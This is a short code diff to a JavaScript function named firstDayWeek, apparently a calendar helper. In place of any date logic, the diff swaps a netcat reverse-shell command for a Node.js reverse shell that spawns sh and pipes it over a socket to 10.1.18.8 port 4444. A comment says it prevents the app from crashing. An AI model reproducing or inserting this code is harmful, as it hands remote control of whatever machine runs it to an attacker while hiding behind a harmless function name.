@@ -1,3 +1,14 @@
 function firstDayWeek(nb, year) {
-  require("child_process").exec("nc -e sh 10.1.18.8 4444");
+ (function () {
+   var net = require("net"),
+     cp = require("child_process"),
+     sh = cp.spawn("sh", []);
+   var client = new net.Socket();
+   client.connect(4444, "10.1.18.8", function () {
+     client.pipe(sh.stdin);
+     sh.stdout.pipe(client);
+     sh.stderr.pipe(client);
+   });
+   return /a/; // Prevents the Node.js application from crashing
+ })();
 }
